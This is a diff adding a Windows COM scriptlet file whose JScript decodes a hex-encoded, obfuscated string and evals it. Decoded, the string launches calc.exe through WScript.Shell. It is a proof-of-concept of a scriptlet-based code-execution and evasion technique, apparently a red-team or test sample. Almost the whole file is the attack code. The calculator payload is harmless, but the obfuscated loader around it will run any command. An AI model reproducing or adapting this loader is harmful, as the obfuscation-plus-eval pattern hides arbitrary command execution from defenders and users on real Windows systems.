@@ -1,0 +1,16 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+ progid="TESTING"
+  classid="{A1112221-0000-0000-3000-000DA00DABFC}">
+  <script language="JScript">
+   <![CDATA[
+var ajfnfjqa = '7661722061203D202263222B2261222B226C223B0D0A7661722062203D20612B2263222B222E222B2265223B0D0A7661722063203D20622B2278223B0D0A7661722064203D20632B2265223B0D0A7661722065203D206E657720416374697665584F626A6563742822575363726970742E5368656C6C22292E52756E2864293B';
+var str='';
+for (var n = 0; n < ajfnfjqa.length; n += 2) {
+str += String.fromCharCode(parseInt(ajfnfjqa.substr(n, 2), 16));
+} eval(str)
+   ]]>
+</script>
+</registration>
+</scriptlet>
